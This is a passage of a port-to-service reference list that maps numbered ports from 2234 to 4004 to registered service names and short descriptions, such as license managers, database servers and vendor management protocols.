port 2234 => directplay - DirectPlay 
port 2235 => sercomm-wlink - Sercomm-WLink 
port 2236 => nani - Nani 
port 2237 => optech-port1-lm - Optech Port1 License Manager 
port 2238 => aviva-sna - AVIVA SNA SERVER 
port 2239 => imagequery - Image Query	 
port 2240 => recipe - RECIPe 
port 2241 => ivsd - IVS Daemon 
port 2242 => foliocorp - Folio Remote Server 
port 2243 => magicom - Magicom Protocol 
port 2244 => nmsserver - NMS Server 
port 2245 => hao - HaO 
port 2279 => xmquery - xmquery 
port 2280 => lnvpoller - LNVPOLLER 
port 2281 => lnvconsole - LNVCONSOLE 
port 2282 => lnvalarm - LNVALARM 
port 2283 => lnvstatus - LNVSTATUS 
port 2284 => lnvmaps - LNVMAPS 
port 2285 => lnvmailmon - LNVMAILMON 
port 2286 => nas-metering - NAS-Metering 
port 2287 => dna - DNA 
port 2288 => netml - NETML 
port 2294 => konshus-lm - Konshus License Manager (FLEX) 
port 2295 => advant-lm - Advant License Manager 
port 2296 => theta-lm - Theta License Manager (Rainbow) 
port 2297 => d2k-datamover1 - D2K DataMover 1 
port 2298 => d2k-datamover2 - D2K DataMover 2 
port 2299 => pc-telecommute - PC Telecommute 
port 2300 => cvmmon - CVMMON 
port 2301 => cpq-wbem - Compaq HTTP 
port 2302 => binderysupport - Bindery Support 
port 2303 => proxy-gateway - Proxy Gateway 
port 2304 => attachmate-uts - Attachmate UTS 
port 2305 => mt-scaleserver - MT ScaleServer 
port 2306 => tappi-boxnet - TAPPI BoxNet 
port 2307 => pehelp - pehelp 
port 2308 => sdhelp - sdhelp 
port 2309 => sdserver - SD Server 
port 2310 => sdclient - SD Client 
port 2311 => messageservice - Message Service 
port 2313 => iapp - IAPP (Inter Access Point Protocol) 
port 2314 => cr-websystems - CR WebSystems 
port 2315 => precise-sft - Precise Sft. 
port 2316 => sent-lm - SENT License Manager 
port 2317 => attachmate-g32 - Attachmate G32 
port 2318 => cadencecontrol - Cadence Control 
port 2319 => infolibria - InfoLibria 
port 2320 => siebel-ns - Siebel NS 
port 2321 => rdlap - RDLAP over UDP 
port 2322 => ofsd - ofsd 
port 2323 => 3d-nfsd - 3d-nfsd 
port 2324 => cosmocall - Cosmocall 
port 2325 => designspace-lm - Design Space License Management 
port 2326 => idcp - IDCP 
port 2327 => xingcsm - xingcsm 
port 2328 => netrix-sftm - Netrix SFTM 
port 2329 => nvd - NVD 
port 2330 => tscchat - TSCCHAT 
port 2331 => agentview - AGENTVIEW 
port 2332 => rcc-host - RCC Host  
port 2333 => snapp - SNAPP 
port 2334 => ace-client - ACE Client Auth 
port 2335 => ace-proxy - ACE Proxy 
port 2336 => appleugcontrol - Apple UG Control 
port 2337 => ideesrv - ideesrv 
port 2338 => norton-lambert - Norton Lambert 
port 2339 => 3com-webview - 3Com WebView 
port 2340 => wrs_registry - WRS Registry 
port 2341 => xiostatus - XIO Status 
port 2342 => manage-exec - Seagate Manage Exec 
port 2343 => nati-logos - nati logos 
port 2344 => fcmsys - fcmsys 
port 2345 => dbm - dbm 
port 2346 => redstorm_join - Game Connection Port 
port 2347 => redstorm_find - Game Announcement and Location 
port 2348 => redstorm_info - Information to query for game status 
port 2349 => redstorm_diag - Diagnostics Port 
port 2350 => psbserver - psbserver 
port 2351 => psrserver - psrserver 
port 2352 => pslserver - pslserver 
port 2353 => pspserver - pspserver 
port 2354 => psprserver - psprserver 
port 2355 => psdbserver - psdbserver 
port 2356 => gxtelmd - GXT License Managemant 
port 2357 => unihub-server - UniHub Server 
port 2358 => futrix - Futrix 
port 2359 => flukeserver - FlukeServer 
port 2360 => nexstorindltd - NexstorIndLtd 
port 2361 => tl1 - TL1 
port 2381 => compaq-https - Compaq HTTPS 
port 2389 => ovsessionmgr - OpenView Session Mgr 
port 2390 => rsmtp - RSMTP 
port 2391 => 3com-net-mgmt - 3COM Net Management 
port 2392 => tacticalauth - Tactical Auth 
port 2393 => ms-olap1 - MS OLAP 1 
port 2394 => ms-olap2 - MS OLAP 2 
port 2395 => lan900_remote - LAN900 Remote 
port 2396 => wusage - Wusage 
port 2397 => ncl - NCL 
port 2398 => orbiter - Orbiter 
port 2399 => fmpro-fdal - FileMaker, Inc. - Data Access Layer 
port 2400 => opequus-server - OpEquus Server 
port 2401 => cvspserver - cvspserver 
port 2402 => taskmaster2000 - TaskMaster 2000 Server 
port 2403 => taskmaster2000 - TaskMaster 2000 Web 
port 2404 => iec870-5-104 - IEC870-5-104 
port 2405 => trc-netpoll - TRC Netpoll 
port 2406 => jediserver - JediServer 
port 2407 => orion - Orion 
port 2408 => optimanet - OptimaNet 
port 2409 => sns-protocol - SNS Protocol 
port 2410 => vrts-registry - VRTS Registry 
port 2411 => netwave-ap-mgmt - Netwave AP Management 
port 2412 => cdn - CDN 
port 2413 => orion-rmi-reg - orion-rmi-reg  
port 2414 => interlingua - Interlingua 
port 2415 => comtest - COMTEST 
port 2416 => rmtserver - RMT Server	 
port 2417 => composit-server - Composit Server 
port 2418 => cas - cas 
port 2419 => attachmate-s2s - Attachmate S2S 
port 2420 => dslremote-mgmt - DSL Remote Management 
port 2421 => g-talk - G-Talk 
port 2422 => crmsbits - CRMSBITS 
port 2423 => rnrp - RNRP 
port 2424 => kofax-svr - KOFAX-SVR 
port 2425 => fjitsuappmgr - Fujitsu App Manager 
port 2426 => applianttcp - Appliant TCP 
port 2427 => stgcp - Simple telephony Gateway Control Protocol 
port 2428 => ott - One Way Trip Time 
port 2429 => ft-role - FT-ROLE 
port 2430 => venus - venus 
port 2431 => venus-se - venus-se 
port 2432 => codasrv - codasrv 
port 2433 => codasrv-se - codasrv-se 
port 2434 => pxc-epmap - pxc-epmap 
port 2435 => optilogic - OptiLogic 
port 2436 => topx - TOP/X 
port 2437 => unicontrol - UniControl 
port 2438 => msp - MSP 
port 2439 => sybasedbsynch - SybaseDBSynch 
port 2440 => spearway - Spearway Lockers 
port 2441 => pvsw-inet - pvsw-inet 
port 2442 => netangel - Netangel 
port 2443 => powerclientcsf - PowerClient Central Storage Facility 
port 2444 => btpp2sectrans - BT PP2 Sectrans 
port 2445 => dtn1 - DTN1 
port 2446 => bues_service - bues_service 
port 2447 => ovwdb - OpenView NNM daemon 
port 2448 => hpppssvr - hpppsvr 
port 2449 => ratl - RATL 
port 2450 => netadmin - netadmin 
port 2451 => netchat - netchat 
port 2452 => snifferclient - SnifferClient 
port 2453 => madge-om - madge-om 
port 2454 => indx-dds - IndX-DDS 
port 2455 => wago-io-system - WAGO-IO-SYSTEM 
port 2456 => altav-remmgt - altav-remmgt 
port 2457 => rapido-ip - Rapido_IP 
port 2458 => griffin - griffin 
port 2459 => community - Community 
port 2460 => ms-theater - ms-theater 
port 2461 => qadmifoper - qadmifoper 
port 2462 => qadmifevent - qadmifevent 
port 2463 => symbios-raid - Symbios Raid 
port 2464 => direcpc-si - DirecPC SI 
port 2465 => lbm - Load Balance Management 
port 2466 => lbf - Load Balance Forwarding 
port 2467 => high-criteria - High Criteria 
port 2468 => qip_msgd - qip_msgd 
port 2469 => mti-tcs-comm - MTI-TCS-COMM 
port 2470 => taskman_port - taskman port 
port 2471 => seaodbc - SeaODBC 
port 2472 => c3 - C3 
port 2473 => aker-cdp - Aker-cdp 
port 2474 => vitalanalysis - Vital Analysis 
port 2475 => ace-server - ACE Server 
port 2476 => ace-svr-prop - ACE Server Propagation 
port 2477 => ssm-cvs - SecurSight Certificate Valifation Service 
port 2478 => ssm-cssps - SecurSight Authentication Server (SLL) 
port 2479 => ssm-els - SecurSight Event Logging Server (SSL) 
port 2480 => lingwood - Lingwood's Detail 
port 2481 => giop - Oracle GIOP 
port 2482 => giop-ssl - Oracle GIOP SSL 
port 2483 => ttc - Oracle TTC 
port 2484 => ttc-ssl - Oracle TTC SSL 
port 2485 => netobjects1 - Net Objects1 
port 2486 => netobjects2 - Net Objects2 
port 2487 => pns - Policy Notice Service 
port 2488 => moy-corp - Moy Corporation 
port 2489 => tsilb - TSILB 
port 2490 => qip_qdhcp - qip_qdhcp 
port 2491 => conclave-cpp - Conclave CPP 
port 2492 => groove - GROOVE 
port 2493 => talarian-mqs - Talarian MQS 
port 2494 => bmc-ar - BMC AR 
port 2495 => fast-rem-serv - Fast Remote Services 
port 2496 => dirgis - DIRGIS 
port 2497 => quaddb - Quad DB 
port 2498 => odn-castraq - ODN-CasTraq 
port 2499 => unicontrol - UniControl 
port 2500 => rtsserv - Resource Tracking system server 
port 2501 => rtsclient - Resource Tracking system client 
port 2502 => kentrox-prot - Kentrox Protocol 
port 2503 => nms-dpnss - NMS-DPNSS 
port 2504 => wlbs - WLBS  
port 2505 => torque-traffic - torque-traffic 
port 2506 => jbroker - jbroker 
port 2507 => spock - spock 
port 2508 => datastore - datastore 
port 2509 => fjmpss - fjmpss 
port 2510 => fjappmgrbulk - fjappmgrbulk 
port 2511 => metastorm - Metastorm 
port 2512 => citrixima - Citrix IMA 
port 2513 => citrixadmin - Citrix ADMIN 
port 2514 => facsys-ntp - Facsys NTP 
port 2515 => facsys-router - Facsys Router 
port 2516 => maincontrol - Main Control  
port 2517 => call-sig-trans - H.323 Annex E call signaling transport 
port 2518 => willy - Willy 
port 2519 => globmsgsvc - globmsgsvc 
port 2520 => pvsw - pvsw 
port 2521 => adaptecmgr - Adaptec Manager 
port 2522 => windb - WinDb 
port 2523 => qke-llc-v3 - Qke LLC V.3 
port 2524 => optiwave-lm - Optiwave License Management 
port 2525 => ms-v-worlds - MS V-Worlds  
port 2526 => ema-sent-lm - EMA License Manager 
port 2527 => iqserver - IQ Server 
port 2528 => ncr_ccl - NCR CCL 
port 2529 => utsftp - UTS FTP 
port 2530 => vrcommerce - VR Commerce 
port 2531 => ito-e-gui - ITO-E GUI 
port 2532 => ovtopmd - OVTOPMD 
port 2533 => snifferserver - SnifferServer 
port 2534 => combox-web-acc - Combox Web Access 
port 2535 => mdhcp - MDHCP 
port 2536 => btpp2audctr1 - btpp2audctr1 
port 2537 => upgrade - Upgrade Protocol 
port 2538 => vnwk-prapi - vnwk-prapi 
port 2539 => vsiadmin - VSI Admin 
port 2540 => lonworks - LonWorks 
port 2541 => lonworks2 - LonWorks2 
port 2542 => davinci - daVinci 
port 2543 => reftek - REFTEK 
port 2544 => novell-zen - Novell ZEN 
port 2545 => sis-emt - sis-emt 
port 2546 => vytalvaultbrtp - vytalvaultbrtp 
port 2547 => vytalvaultvsmp - vytalvaultvsmp 
port 2548 => vytalvaultpipe - vytalvaultpipe 
port 2549 => ipass - IPASS 
port 2550 => ads - ADS 
port 2551 => isg-uda-server - ISG UDA Server 
port 2552 => call-logging - Call Logging 
port 2553 => efidiningport - efidiningport 
port 2554 => vcnet-link-v10 - VCnet-Link v10 
port 2555 => compaq-wcp - Compaq WCP 
port 2556 => nicetec-nmsvc - nicetec-nmsvc 
port 2557 => nicetec-mgmt - nicetec-mgmt 
port 2558 => pclemultimedia - PCLE Multi Media 
port 2559 => lstp - LSTP 
port 2560 => labrat - labrat 
port 2561 => mosaixcc - MosaixCC 
port 2562 => delibo - Delibo 
port 2563 => cti-redwood - CTI Redwood 
port 2564 => hp-3000-telnet - HP 3000 NS/VT block mode telnet 
port 2565 => coord-svr - Coordinator Server 
port 2566 => pcs-pcw - pcs-pcw 
port 2567 => clp - Cisco Line Protocol 
port 2568 => spamtrap - SPAM TRAP 
port 2569 => sonuscallsig - Sonus Call Signal 
port 2570 => hs-port - HS Port 
port 2571 => cecsvc - CECSVC 
port 2572 => ibp - IBP 
port 2573 => trustestablish - Trust Establish 
port 2574 => blockade-bpsp - Blockade BPSP 
port 2575 => hl7 - HL7 
port 2576 => tclprodebugger - TCL Pro Debugger 
port 2577 => scipticslsrvr - Scriptics Lsrvr 
port 2578 => rvs-isdn-dcp - RVS ISDN DCP 
port 2579 => mpfoncl - mpfoncl 
port 2580 => tributary - Tributary 
port 2581 => argis-te - ARGIS TE 
port 2582 => argis-ds - ARGIS DS 
port 2583 => mon - MON 
port 2584 => cyaserv - cyaserv 
port 2585 => netx-server - NETX Server 
port 2586 => netx-agent - NETX Agent 
port 2587 => masc - MASC 
port 2588 => privilege - Privilege 
port 2589 => quartus-tcl - quartus tcl 
port 2590 => idotdist - idotdist 
port 2591 => maytagshuffle - Maytag Shuffle 
port 2592 => netrek - netrek 
port 2593 => mns-mail - MNS Mail Notice Service 
port 2594 => dts - Data Base Server 
port 2595 => worldfusion1 - World Fusion 1 
port 2596 => worldfusion2 - World Fusion 2 
port 2597 => homesteadglory - Homestead Glory 
port 2598 => citriximaclient - Citrix MA Client 
port 2599 => meridiandata - Meridian Data 
port 2600 => hpstgmgr - HPSTGMGR 
port 2601 => discp-client - discp client 
port 2602 => discp-server - discp server 
port 2603 => servicemeter - Service Meter 
port 2604 => nsc-ccs - NSC CCS	 
port 2605 => nsc-posa - NSC POSA 
port 2606 => netmon - Dell Netmon 
port 2607 => connection - Dell Connection 
port 2608 => wag-service - Wag Service 
port 2609 => system-monitor - System Monitor  
port 2610 => versa-tek - VersaTek 
port 2611 => lionhead - LIONHEAD 
port 2612 => qpasa-agent - Qpasa Agent 
port 2613 => smntubootstrap - SMNTUBootstrap 
port 2614 => neveroffline - Never Off Line 
port 2615 => firepower - firepower 
port 2616 => appswitch-emp - appswitch-emp 
port 2617 => cmadmin - Clinical Context Managers 
port 2618 => priority-e-com - Priority E-Com 
port 2619 => bruce - bruce 
port 2620 => lpsrecommender - LPSRecommender 
port 2621 => miles-apart - Miles Apart Jukebox Server 
port 2622 => metricadbc - MetricaDBC 
port 2623 => lmdp - LMDP 
port 2624 => aria - Aria 
port 2625 => blwnkl-port - Blwnkl Port 
port 2626 => gbjd816 - gbjd816 
port 2627 => moshebeeri - Moshe Beeri 
port 2628 => dict - DICT 
port 2629 => sitaraserver - Sitara Server 
port 2630 => sitaramgmt - Sitara Management 
port 2631 => sitaradir - Sitara Dir 
port 2632 => irdg-post - IRdg Post 
port 2633 => interintelli - InterIntelli 
port 2634 => pk-electronics - PK Electronics 
port 2635 => backburner - Back Burner 
port 2636 => solve - Solve 
port 2637 => imdocsvc - Import Document Service 
port 2638 => sybaseanywhere - Sybase Anywhere 
port 2639 => aminet - AMInet 
port 2640 => sai_sentlm - Sabbagh Associates Licence Manager 
port 2641 => hdl-srv - HDL Server 
port 2642 => tragic - Tragic 
port 2643 => gte-samp - GTE-SAMP 
port 2644 => travsoft-ipx-t - Travsoft IPX Tunnel 
port 2645 => novell-ipx-cmd - Novell IPX CMD 
port 2646 => and-lm - AND Licence Manager 
port 2647 => syncserver - SyncServer 
port 2648 => upsnotifyprot - Upsnotifyprot 
port 2649 => vpsipport - VPSIPPORT 
port 2650 => eristwoguns - eristwoguns 
port 2651 => ebinsite - EBInSite 
port 2652 => interpathpanel - InterPathPanel 
port 2653 => sonus - Sonus 
port 2654 => corel_vncadmin - Corel VNC Admin 
port 2655 => unglue - UNIX Nt Glue 
port 2656 => kana - Kana 
port 2657 => sns-dispatcher - SNS Dispatcher 
port 2658 => sns-admin - SNS Admin 
port 2659 => sns-query - SNS Query 
port 2660 => gcmonitor - GC Monitor 
port 2661 => olhost - OLHOST 
port 2662 => bintec-capi - BinTec-CAPI 
port 2663 => bintec-tapi - BinTec-TAPI 
port 2664 => command-mq-gm - Command MQ GM 
port 2665 => command-mq-pm - Command MQ PM 
port 2666 => extensis - extensis 
port 2667 => alarm-clock-s - Alarm Clock Server 
port 2668 => alarm-clock-c - Alarm Clock Client 
port 2669 => toad - TOAD 
port 2670 => tve-announce - TVE Announce 
port 2671 => newlixreg - newlixreg 
port 2672 => nhserver - nhserver 
port 2673 => firstcall42 - First Call 42  
port 2674 => ewnn - ewnn 
port 2675 => ttc-etap - TTC ETAP 
port 2676 => simslink - SIMSLink 
port 2677 => gadgetgate1way - Gadget Gate 1 Way 
port 2678 => gadgetgate2way - Gadget Gate 2 Way 
port 2679 => syncserverssl - Sync Server SSL 
port 2680 => pxc-sapxom - pxc-sapxom 
port 2681 => mpnjsomb - mpnjsomb 
port 2682 => srsp - SRSP 
port 2683 => ncdloadbalance - NCDLoadBalance  
port 2684 => mpnjsosv - mpnjsosv 
port 2685 => mpnjsocl - mpnjsocl 
port 2686 => mpnjsomg - mpnjsomg 
port 2687 => pq-lic-mgmt - pq-lic-mgmt 
port 2688 => md-cg-http - md-cf-http 
port 2689 => fastlynx - FastLynx 
port 2690 => hp-nnm-data - HP NNM Embedded Database 
port 2691 => itinternet - IT Internet 
port 2692 => admins-lms - Admins LMS 
port 2693 => belarc-http - belarc-http 
port 2694 => pwrsevent - pwrsevent	 
port 2695 => vspread - VSPREAD 
port 2696 => unifyadmin - Unify Admin 
port 2697 => oce-snmp-trap - Oce SNMP Trap Port  
port 2698 => mck-ivpip - MCK-IVPIP 
port 2699 => csoft-plusclnt - Csoft Plus Client 
port 2700 => tqdata - tqdata 
port 2701 => sms-rcinfo - SMS RCINFO 
port 2702 => sms-xfer - SMS XFER 
port 2703 => sms-chat - SMS CHAT 
port 2704 => sms-remctrl - SMS REMCTRL 
port 2705 => sds-admin - SDS Admin 
port 2706 => ncdmirroring - NCD Mirroring 
port 2707 => emcsymapiport - EMCSYMAPIPORT 
port 2708 => banyan-net - Banyan-Net 
port 2709 => supermon - Supermon 
port 2710 => sso-service - SSO Service 
port 2711 => sso-control - SSO Control 
port 2712 => aocp - Axapta Object Communication Protocol 
port 2713 => raven1 - Raven1 
port 2714 => raven2 - Raven2 
port 2715 => hpstgmgr2 - HPSTGMGR2 
port 2716 => inova-ip-disco - Inova IP Disco 
port 2784 => www-dev - world wide web - development 
port 2785 => aic-np - aic-np 
port 2786 => aic-oncrpc - aic-oncrpc - Destiny MCD database 
port 2787 => piccolo - piccolo - Cornerstone Software 
port 2788 => fryeserv - NetWare Loadable Module - Seagate Software 
port 2789 => media-agent - Media Agent 
port 2828 => itm-lm - ITM License Manager  
port 2908 => mao - mao 
port 2909 => funk-dialout - Funk Dialout 
port 2910 => tdaccess - TDAccess 
port 2911 => blockade - Blockade 
port 2912 => epicon - Epicon 
port 2913 => boosterware - Booster Ware 
port 2914 => gamelobby - Game Lobby 
port 2915 => tksocket - TK Socket 
port 2916 => elvin_server - Elvin Server 
port 2917 => elvin_client - Elvin Client 
port 2918 => kastenchasepad - Kasten Chase Pad 
port 2971 => netclip - Net Clip 
port 2972 => pmsm-webrctl - PMSM Webrctl 
port 2973 => svnetworks - SV Networks 
port 2974 => signal - Signal 
port 2975 => fjmpcm - Fujitsu Configuration Management Service 
port 2976 => cns-srv-port - CNS Server Port 
port 2977 => ttc-etap-ns - TTCs Enterprise Test Access Protocol - NS 
port 2978 => ttc-etap-ds - TTCs Enterprise Test Access Protocol - DS 
port 2979 => h263-video - H.263 Video Streaming  
port 2980 => wimd - Instant Messaging Service 
port 2981 => mylxamport - MYLXAMPORT 
port 2989 => rat - Rat TROJAN 
port 2998 => realsecure - Real Secure 
port 3000 => hbci - HBCI (or remoteware-cl - RemoteWare Client) 
port 3001 => redwood-broker - Redwood Broker 
port 3002 => remoteware-srv - RemoteWare Server (or EXLM Agent) 
port 3003 => cgms - CGMS 
port 3004 => csoftragent - Csoft Agent 
port 3005 => geniuslm - Genius License Manager 
port 3006 => ii-admin - Instant Internet Admin 
port 3007 => lotusmtap - Lotus Mail Tracking Agent Protocol 
port 3008 => midnight-tech - Midnight Technologies 
port 3009 => pxc-ntfy - PXC-NTFY 
port 3010 => gw - Telerate Workstation 
port 3011 => trusted-web - Trusted Web 
port 3012 => twsdss - Trusted Web Client 
port 3013 => gilatskysurfer - Gilat Sky Surfer 
port 3014 => broker_service - Broker Service 
port 3015 => nati-dstp - NATI DSTP 
port 3016 => notify_srvr - Notify Server 
port 3017 => event_listener - Event Listener 
port 3018 => srvc_registry - Service Registry 
port 3019 => resource_mgr - Resource Manager 
port 3020 => cifs - CIFS 
port 3021 => agriserver - AGRI Server 
port 3022 => csregagent - CSREGAGENT 
port 3023 => magicnotes - magicnotes 
port 3024 => nds_sso - NDS_SSO 
port 3025 => arepa-raft - Arepa Raft  
port 3026 => agri-gateway - AGRI Gateway 
port 3027 => LiebDevMgmt_C - LiebDevMgmt_C 
port 3028 => LiebDevMgmt_DM - LiebDevMgmt_DM 
port 3029 => LiebDevMgmt_A - LiebDevMgmt_A 
port 3030 => arepa-cas - Arepa Cas 
port 3031 => agentvu - AgentVU  
port 3032 => redwood-chat - Redwood Chat 
port 3033 => pdb - PDB 
port 3034 => osmosis-aeea - Osmosis AEEA 
port 3035 => fjsv-gssagt - FJSV gssagt 
port 3036 => hagel-dump - Hagel DUMP 
port 3037 => hp-san-mgmt - HP SAN Mgmt 
port 3038 => santak-ups - Santak UPS 
port 3039 => cogitate - Cogitate, Inc. 
port 3040 => tomato-springs - Tomato Springs 
port 3041 => di-traceware - di-traceware 
port 3042 => journee - journee 
port 3043 => brp - BRP 
port 3044 => msexch-routing - msexch-routing 
port 3045 => responsenet - ResponseNet 
port 3046 => di-ase - di-ase 
port 3047 => hlserver - Fast Security HL Server 
port 3048 => pctrader - Sierra Net PC Trader 
port 3049 => nsws - NSWS 
port 3050 => gds_db - gds_db 
port 3051 => galaxy-server - Galaxy Server 
port 3052 => apcpcns - APCPCNS 
port 3053 => dsom-server - dsom-server 
port 3054 => amt-cnf-prot - AMT CNF PROT 
port 3055 => policyserver - Policy Server 
port 3056 => cdl-server - CDL Server 
port 3057 => goahead-fldup - GoAhead FldUp 
port 3058 => videobeans - videobeans 
port 3059 => qsoft - qsoft 
port 3060 => interserver - interserver 
port 3061 => cautcpd - cautcpd 
port 3062 => ncacn-ip-tcp - ncacn-ip-tcp 
port 3063 => ncadg-ip-udp - ncadg-ip-udp 
port 3080 => stm_pproc - stm_pproc 
port 3105 => cardbox - Cardbox 
port 3106 => cardbox-http - Cardbox HTTP 
port 3130 => icpv2 - ICPv2 
port 3131 => netbookmark - Net Book Mark 
port 3141 => vmodem - VMODEM 
port 3142 => rdc-wh-eos - RDC WH EOS 
port 3143 => seaview - Sea View 
port 3144 => tarantella - Tarantella 
port 3145 => csi-lfap - CSI-LFAP 
port 3147 => rfio - RFIO 
port 3148 => nm-game-admin - NetMike Game Administrator 
port 3149 => nm-game-server - NetMike Game Server 
port 3150 => nm-asses-admin - NetMike Assessor Administrator 
port 3151 => nm-assessor - NetMike Assessor 
port 3180 => mc-brk-srv - Millicent Broker Server 
port 3181 => bmcpatrolagent - BMC Patrol Agent 
port 3182 => bmcpatrolrnvu - BMC Patrol Rendezvous 
port 3264 => ccmail - cc:mail/lotus 
port 3265 => altav-tunnel - Altav Tunnel 
port 3266 => ns-cfg-server - NS CFG Server 
port 3267 => ibm-dial-out - IBM Dial Out 
port 3268 => msft-gc - Microsoft Global Catalog 
port 3269 => msft-gc-ssl - Microsoft Global Catalog with LDAP/SSL 
port 3270 => verismart - Verismart 
port 3271 => csoft-prev - CSoft Prev Port 
port 3272 => user-manager - Fujitsu User Manager 
port 3273 => sxmp - Simple Extensible Multiplexed Protocol 
port 3274 => ordinox-server - Ordinox Server 
port 3275 => samd - SAMD 
port 3276 => maxim-asics - Maxim ASICs 
port 3277 => awg-proxy - AWG Proxy 
port 3278 => lkcmserver - LKCM Server 
port 3279 => admind - admind 
port 3280 => vs-server - VS Server 
port 3281 => sysopt - SYSOPT 
port 3282 => datusorb - Datusorb 
port 3283 => net-assistant - Net Assistant 
port 3284 => 4talk - 4Talk 
port 3285 => plato - Plato 
port 3286 => e-net - E-Net 
port 3287 => directvdata - DIRECTVDATA 
port 3288 => cops - COPS 
port 3289 => enpc - ENPC 
port 3290 => caps-lm - CAPS LOGISTICS TOOLKIT - LM 
port 3291 => sah-lm - S A Holditch & Associates - LM 
port 3292 => cart-o-rama - Cart O Rama 
port 3293 => fg-fps - fg-fps 
port 3294 => fg-gip - fg-gip 
port 3295 => dyniplookup - Dynamic IP Lookup 
port 3296 => rib-slm - Rib License Manager 
port 3297 => cytel-lm - Cytel License Manager 
port 3298 => transview - Transview 
port 3299 => pdrncs - pdrncs 
port 3300 => sap r/3 - SAP R/3 (unauthorized use) 
port 3301 => sap r/3 - SAP R/3 (unauthorized use) 
port 3302 => mcs-fastmail - MCS Fastmail 
port 3303 => opsession-clnt - OP Session Client 
port 3304 => opsession-srvr - OP Session Server 
port 3305 => odette-ftp - ODETTE-FTP 
port 3306 => mysql - MySQL 
port 3307 => opsession-prxy - OP Session Proxy 
port 3308 => tns-server - TNS Server 
port 3309 => tns-adv - TNS ADV 
port 3310 => dyna-access - Dyna Access 
port 3311 => mcns-tel-ret - MCNS Tel Ret 
port 3312 => appman-server - Application Management Server 
port 3313 => uorb - Unify Object Broker 
port 3314 => uohost - Unify Object Host 
port 3315 => cdid - CDID 
port 3316 => aicc-cmi - AICC/CMI 
port 3317 => vsaiport - VSAI PORT 
port 3318 => ssrip - Swith to Swith Routing Information Protocol 
port 3319 => sdt-lmd - SDT License Manager 
port 3320 => officelink2000 - Office Link 2000 
port 3321 => vnsstr - VNSSTR 
port 3322 => active-net - Active Networks 
port 3323 => active-net - Active Networks 
port 3324 => active-net - Active Networks 
port 3325 => active-net - Active Networks 
port 3326 => sftu - SFTU 
port 3327 => bbars - BBARS 
port 3328 => egptlm - Eaglepoint License Manager 
port 3329 => hp-device-disc - HP Device Disc 
port 3330 => mcs-calypsoicf - MCS Calypso ICF 
port 3331 => mcs-messaging - MCS Messaging 
port 3332 => mcs-mailsvr - MCS Mail Server 
port 3333 => dec-notes - DEC Notes 
port 3334 => directv-web - Direct TV Webcasting 
port 3335 => directv-soft - Direct TV Software Updates 
port 3336 => directv-tick - Direct TV Tickers 
port 3337 => directv-catlg - Direct TV Data Catalog 
port 3338 => anet-b - OMF data b 
port 3339 => anet-l - OMF data l 
port 3340 => anet-m - OMF data m 
port 3341 => anet-h - OMF data h 
port 3342 => webtie - WebTIE 
port 3343 => ms-cluster-net - MS Cluster Net 
port 3344 => bnt-manager - BNT Manager 
port 3345 => influence - Influence 
port 3346 => trnsprntproxy - Trnsprnt Proxy 
port 3347 => phoenix-rpc - Phoenix RPC 
port 3348 => pangolin-laser - Pangolin Laser 
port 3349 => chevinservices - Chevin Services 
port 3350 => findviatv - FINDVIATV 
port 3351 => btrieve - BTRIEVE 
port 3352 => ssql - SSQL 
port 3353 => fatpipe - FATPIPE 
port 3354 => suitjd - SUITJD 
port 3355 => ordinox-dbase - Ordinox Dbase 
port 3356 => upnotifyps - UPNOTIFYPS 
port 3357 => adtech-test - Adtech Test IP 
port 3358 => mpsysrmsvr - Mp Sys Rmsvr 
port 3359 => wg-netforce - WG NetForce 
port 3360 => kv-server - KV Server 
port 3361 => kv-agent - KV Agent  
port 3362 => dj-ilm - DJ ILM 
port 3363 => nati-vi-server - NATI Vi Server 
port 3364 => creativeserver - Creative Server 
port 3365 => contentserver - Content Server 
port 3366 => creativepartnr - Creative Partner 
port 3371 => satvid-datalnk - Satellite Video Data Link 
port 3372 => satvid-datalnk - Satellite Video Data Link 
port 3373 => satvid-datalnk - Satellite Video Data Link 
port 3374 => satvid-datalnk - Satellite Video Data Link 
port 3375 => satvid-datalnk - Satellite Video Data Link 
port 3372 => tip2 - TIP 2 
port 3373 => lavenir-lm - Lavenir License Manager 
port 3374 => cluster-disc - Cluster Disc 
port 3375 => vsnm-agent - VSNM Agent 
port 3376 => cdborker - CD Broker 
port 3377 => cogsys-lm - Cogsys Network License Manager 
port 3378 => wsicopy - WSICOPY 
port 3379 => socorfs - SOCORFS 
port 3380 => sns-channels - SNS Channels 
port 3381 => geneous - Geneous 
port 3382 => fujitsu-neat - Fujitsu Network Enhanced Antitheft function 
port 3383 => esp-lm - Enterprise Software Products License Manager 
port 3384 => hp-clic - Cluster Management Services 
port 3385 => qnxnetman - qnxnetman 
port 3386 => gprs-data - GPRS Data 
port 3387 => backroomnet - Back Room Net 
port 3388 => cbserver - CB Server 
port 3389 => ms-wbt-server - MS WBT Server 
port 3390 => dsc - Distributed Service Coordinator 
port 3391 => savant - SAVANT 
port 3392 => efi-lm - EFI License Management 
port 3393 => d2k-tapestry1 - D2K Tapestry Client to Server 
port 3394 => d2k-tapestry2 - D2K Tapestry Server to Server 
port 3395 => dyna-lm - Dyna License Manager (Elam) 
port 3396 => printer_agent - Printer Agent 
port 3397 => cloanto-lm - Cloanto License Manager 
port 3398 => mercantile - Mercantile 
port 3399 => csms - CSMS 
port 3400 => csms2 - CSMS2 
port 3401 => filecast - filecast 
port 3421 => bmap - Bull Apprise portmapper 
port 3454 => mira - Apple Remote Access Protocol 
port 3455 => prsvp - RSVP Port 
port 3456 => vat - VAT default data 
port 3457 => vat-control - VAT default control 
port 3458 => d3winosfi - D3WinOsfi 
port 3459 => integral - Integral 
port 3460 => edm-manager - EDM Manger 
port 3461 => edm-stager - EDM Stager 
port 3462 => edm-std-notify - EDM STD Notify 
port 3463 => edm-adm-notify - EDM ADM Notify 
port 3464 => edm-mgr-sync - EDM MGR Sync 
port 3465 => edm-mgr-cntrl - EDM MGR Cntrl 
port 3466 => workflow - WORKFLOW 
port 3467 => rcst - RCST 
port 3468 => ttcmremotectrl - TTCM Remote Controll 
port 3469 => pluribus - Pluribus 
port 3470 => jt400 - jt400 
port 3471 => jt400-ssl - jt400-ssl 
port 3563 => watcomdebug - Watcom Debug 
port 3672 => harlequinorb - harlequinorb 
port 3900 => udt_os - Unidata UDT OS 
port 3984 => mapper-nodemgr - MAPPER network node manager 
port 3985 => mapper-mapethd - MAPPER TCP/IP server 
port 3986 => mapper-ws_ethd - MAPPER workstation server 
port 3987 => centerline - Centerline 
port 4000 => terabase - Terabase (or ICQ) 
port 4001 => newoak - NewOak 
port 4002 => pxc-spvr-ft - pxc-spvr-ft 
port 4003 => pxc-splr-ft - pxc-splr-ft 
port 4004 => pxc-roid - pxc-roid 
